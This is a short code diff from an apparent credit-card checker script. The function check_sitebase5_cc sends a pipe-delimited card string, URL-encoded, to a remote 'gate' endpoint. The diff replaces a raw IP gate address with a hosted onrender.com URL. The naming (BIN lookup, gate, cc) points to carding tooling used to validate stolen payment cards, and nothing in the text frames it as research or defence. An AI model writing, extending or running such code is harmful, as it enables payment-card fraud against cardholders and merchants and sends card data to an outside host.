@@ -5175,7 +5175,7 @@ def check_sitebase5_cc(cc):
             print(f"BIN Lookup Error: {e}")
 
         # API Call
-        url = f"http://194.164.150.141:5500/gate=site5/cc={formatted_cc.replace('|', '%7C')}"
+        url = f"https://site5-eldd.onrender.com/gate=pipeline/key=whoami/cc={formatted_cc.replace('|', '%7C')}"
         response = requests.get(url, timeout=60)
         raw_data = response.json()
 
